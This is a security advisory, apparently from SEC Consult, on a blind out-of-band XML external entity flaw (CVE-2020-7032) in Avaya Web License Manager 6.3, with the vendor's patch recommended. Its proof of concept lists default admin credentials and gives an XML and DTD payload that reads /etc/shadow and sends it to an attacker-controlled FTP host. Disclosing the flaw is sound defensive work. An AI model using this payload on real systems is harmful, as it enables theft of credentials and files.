Business recommendation:
------------------------
The vendor provides a patch for the Avaya Web License Manager which
should be installed immediately.

SEC Consult recommends to perform a thorough security review conducted by
security professionals to identify and resolve all security issues.


Vulnerability overview/description:
-----------------------------------
1) Blind Out-Of-Band XML External Entity Injection (CVE-2020-7032)
This vulnerability within the Avaya Web License Manager (WebLM) allows an
authenticated user to read arbitrary files in the context of the Webserver
(Tomcat) by uploading a specially crafted XML file within the License upload
functionality. Accessible sensitive files that can be read are for example
/etc/shadow, SSH keys or other configuration files.


Proof of concept:
-----------------
1) Blind Out-Of-Band XML External Entity Injection (CVE-2020-7032)
Login as a user to https://$IP/WebLM/ and navigate to "Install License". If
WebLM has never been used before or not hardened, the default credentials are
admin:weblmadmin

Create an XML file like the following:

<?xml version="1.0" ?>
<!DOCTYPE a [
<!ENTITY % asd SYSTEM "http://$ATTACKER_IP/xxe_file.dtd">
%asd;
%c;
]>
<a>&rrr;</a>

and a DTD file like:

<!ENTITY % d SYSTEM "file:///etc/shadow">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://$ATTACKER_IP:2121/%d;'>">

Start a webserver, e.g. SimpleHTTPServer

python -m SimpleHTTPServer 80

and an FTP server like GO XXE FTP Server

./xxeserv 2121

Upload the crafted XML file by clicking the install button.


Vulnerable / tested versions:
-----------------------------
The following version has been tested:
* Avaya Web License Manager 6.3

The vendor doesn't support versions < 7.x. Probably all versions <7 are
affected.
